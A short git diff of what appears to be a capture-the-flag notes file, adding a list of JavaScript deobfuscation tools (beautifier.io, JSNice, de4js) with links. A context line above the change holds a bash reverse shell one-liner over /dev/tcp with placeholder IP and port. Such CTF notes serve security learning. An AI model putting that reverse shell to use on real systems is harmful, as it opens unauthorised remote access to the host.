@@ -323,6 +323,17 @@ exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
 ```
 
 
+javascript_files:
+
+```
+beautifier.io - This one just beautifies the JS to make it easier to read.
+JSNice.org - A tool that is really good at working through basic JavaScript obfuscation.
+de4js - A tool that can work through JS obfuscation techniques.
+```
+[beautifier.io](https://beautifier.io/)
+[JSNice.org](http://jsnice.org/)
+[de4js](https://lelinhtinh.github.io/de4js/)
+
 
 resources:
 [^1]:https://github.com/digital-overdose/ctf-writeups/edit/main/2022-KNIGHT_CTF/ALPHABET_KNOCK_CODE.md
